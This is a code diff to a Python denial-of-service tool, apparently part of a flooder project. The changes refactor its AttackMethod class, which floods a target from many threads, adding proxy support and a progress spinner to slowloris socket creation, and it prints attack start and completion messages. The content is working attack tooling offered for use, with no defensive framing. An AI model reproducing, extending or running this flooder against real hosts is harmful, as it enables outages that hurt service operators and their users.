@@ -6,12 +6,13 @@ import socket
 import sys
 from threading import Thread
 from time import sleep, time
-from typing import Any, List, Union
+from typing import Any, Dict, List, Tuple, Union
 
 from colorama import Fore  # type: ignore[import]
 from humanfriendly import Spinner, format_timespan  # type: ignore[import]
 
-from tools.ip_tools import create_socket, get_target_address  # type: ignore[import]
+from tools.addons.sockets import create_socket  # type: ignore[import]
+from tools.ip_tools import get_target_address  # type: ignore[import]
 
 
 def get_method_by_name(method: str) -> Any:
@@ -78,32 +79,37 @@ class AttackMethod:
             sleep(1)
         self.is_running = False
 
-    def __run_flood(self, sock: Union[socket.SocketType, None] = None) -> None:
+    def __run_flood(self, *args: Tuple[Any, Union[Dict[str, str], None]]) -> None:
         """Start the flooder."""
         while self.is_running:
-            if sock:
-                self.method(sock)
-                sleep(self.sleep_time)
-            else:
+            try:
+                if args[0]:
+                    self.method(args[0], args[1])
+                    sleep(self.sleep_time)
+            except IndexError:
                 self.method(self.target, self.use_proxy)
 
     def __run_threads(self) -> None:
         """Initialize the threads."""
-        timing = Thread(target=self.__run_timer)
-        timing.start()
-
         if self.method_name.lower() == "slowloris":
-            self.sockets = [
-                create_socket(self.target) for _ in range(self.threads_count)
-            ]
-            self.threads = [
-                Thread(target=self.__run_flood, args=(self.sockets[i],))
-                for i in range(self.threads_count)
-            ]
+            with Spinner(
+                label=f"{Fore.YELLOW}Creating Sockets...{Fore.RESET}",
+                total=100,
+            ) as spinner:
+                for _ in range(self.threads_count):
+                    sock, proxy = create_socket(self.target, self.use_proxy)
+                    self.sockets.append(sock)
+                    self.threads.append(
+                        Thread(target=self.__run_flood, args=(self.sockets[-1], proxy))
+                    )
+                    spinner.step(100 / self.threads_count * (len(self.sockets) + 1))
         else:
             self.threads = [
                 Thread(target=self.__run_flood) for _ in range(self.threads_count)
             ]
+
+        timing = Thread(target=self.__run_timer)
+        timing.start()
 
         with Spinner(
             label=f"{Fore.YELLOW}Starting {self.threads_count} threads{Fore.RESET}",
@@ -115,9 +121,7 @@ class AttackMethod:
 
         for index, thread in enumerate(self.threads):
             thread.join()
-            print(
-                f"{Fore.GREEN}[+] {Fore.YELLOW}Thread {index + 1} stopped.{Fore.RESET}"
-            )
+            print(f"{Fore.RED}[-] {Fore.YELLOW}Thread {index + 1} stopped.{Fore.RESET}")
 
         print(f"{Fore.MAGENTA}\n\n[!] {Fore.BLUE}Attack Completed!\n\n{Fore.RESET}")
 
@@ -126,7 +130,7 @@ class AttackMethod:
         target = str(self.target).strip("()").replace(", ", ":").replace("'", "")
         duration = format_timespan(self.duration)
         print(
-            f"{Fore.MAGENTA}\n\n[!] {Fore.BLUE}Attacking {target} using {self.method_name} method.{Fore.RESET}"
+            f"{Fore.MAGENTA}\n[!] {Fore.BLUE}Attacking {target} using {self.method_name} method.{Fore.RESET}"
             f"{Fore.MAGENTA}\n\n[!] {Fore.BLUE}The attack will stop after {Fore.MAGENTA}{duration}{Fore.BLUE}.\n\n{Fore.RESET}"
         )
 
